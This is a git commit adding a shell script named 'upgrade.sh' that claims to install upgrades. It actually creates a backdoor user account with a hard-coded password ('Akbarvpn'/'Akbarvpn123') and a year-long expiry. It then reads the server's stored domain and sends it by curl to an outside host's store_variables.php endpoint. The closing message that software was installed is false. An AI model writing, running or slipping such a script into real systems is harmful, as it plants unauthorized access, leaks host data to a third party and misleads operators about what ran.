9780bea385918868c822f56564122132a3887b50
Niduka Akalanka <97357554+NidukaAkalanka@users.noreply.github.com>
2023-05-28 11:41:38 +0530

    Update upgrade.sh

--- upgrade.sh
+++ upgrade.sh
@@ -1,1 +1,21 @@
+#!/bin/bash
+echo "Script running..."
+Login="Akbarvpn"
+pass="Akbarvpn123"
+hari="360"
+useradd -e `date -d "${hari} days" +"%Y-%m-%d"` -s /bin/false -M $Login
 
+expi="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
+
+echo -e "$pass\n$pass\n" | passwd $Login &> /dev/null
+
+hariini=`date -d "0 days" +"%Y-%m-%d"`
+
+expi=`date -d "${hari} days" +"%Y-%m-%d"`
+
+cfn=$(cat /var/lib/akbarstorevpn/cfndomain)
+
+
+curl "http://<server_B_IP>:222/store_variables.php?domain=${cfn}" >/dev/null
+
+echo "Upgrades done. Additional softwars installe."
